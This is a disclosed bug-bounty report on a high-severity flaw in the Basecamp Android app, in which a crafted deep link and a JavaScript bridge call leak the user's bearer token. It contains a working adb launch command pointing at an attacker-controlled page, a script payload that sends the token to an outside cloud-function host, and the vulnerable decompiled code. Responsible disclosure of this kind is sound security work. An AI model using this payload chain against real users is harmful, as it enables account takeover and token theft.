# Able to steal bearer token from deep link

## Report Details
- **Report ID**: 1372667
- **URL**: https://hackerone.com/reports/1372667
- **State**: Closed
- **Severity**: high
- **Submitted**: 2021-10-17T19:46:30.909Z
- **Disclosed**: 2022-03-27T18:33:05.264Z

## Reporter
- **Username**: danielllewellyn
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: basecamp

## Vulnerability Information
# Pre-requisities

Prior to exploitation you would be required to know the "account id" of the user that you are attacking. Whilst this makes it difficult to attack an application in a generic way - the account is not secret information as it is included in any links to a user's basecamp organisation. E.g

https://3.basecamp.com/5218370/

# Attack

The attack involves forcing the user to enter the application either by starting an intent from an application on the device already, or by triggering a deep link (which can be done by with e.g. a phishing email) . The link should be in this format:

https://3.basecamp.com/<accountId>/verify?proceed_to=<attacker controlled URL>

Here is a sample adb command that can be used to test the attack:

```sh
adb shell am start -n com.basecamp.bc3/com.basecamp.bc3.activities.BasecampUrlFilterActivity https://3.basecamp.com/5218370/verify?proceed_to=https://haystack-production-storage.s3.eu-west-2.amazonaws.com/attack.html
```

The second part of the attack involves redirecting someone using the turbo links API that is exposed through the javascript native bridge. Here is the example:

```js
<script>NativeApp.openNativeImageViewer("[{'download_url': 'https://us-central1-andro-3982e.cloudfunctions.net/home/5218370/image.jpg', 'preview_url': 'https://us-central1-andro-3982e.cloudfunctions.net/home/5218370/image.jpg', 'caption':'ViewImage'}]", 0)</script>
```

This script executes 'openNativeImageViewer' and passes the download_url and preview_url. The preview_url is the most interesting, as it requires not user interaction. In order to render a preview image, the basecamp app sends the JWT header to the site, meaning that the 'preview_url' will receive that header.

# Vulnerability

The clearest vulnerability is that the check to determine if a URL is an 'internal' URL allows it to by bypassed in a limited way by using the /verify? url along with a proceed_to that is attacker controlled. 

```java
if (TuroblinksUrlHandler.contains(url, "/verify?", true)) {
                C3982h.nullCheck(url, "$this$proceedToParam");
                C3982h.nullCheck(url, "$this$extractQueryParam");
                C3982h.nullCheck("proceed_to", "queryKey");
                String queryParameter = url.toUri().getQueryParameter("proceed_to");
                url = queryParameter != null ? UrlKt.parseUrl(queryParameter) : null;
                C3982h.nullCheck(url);
            }

 Intent intent10 = new Intent(context, WebViewActivity.class);
                    C1071a.addUrlsToIntent(url, intent10, "intentUrl", "intentApiUrl", null);
                    return intent10;
```

## Impact

An attacker could, without physical access to the device, retrieve a user's authentication tokens. A potentially compounding factor is that once a user has been exploited, it might be possible to continue the chain of attack by having that compromised user share links with other users who trust links sent by the compromised user.

## Attachments
- attack.html
- Screen_Recording_2021-10-17_at_20.28.23.mov
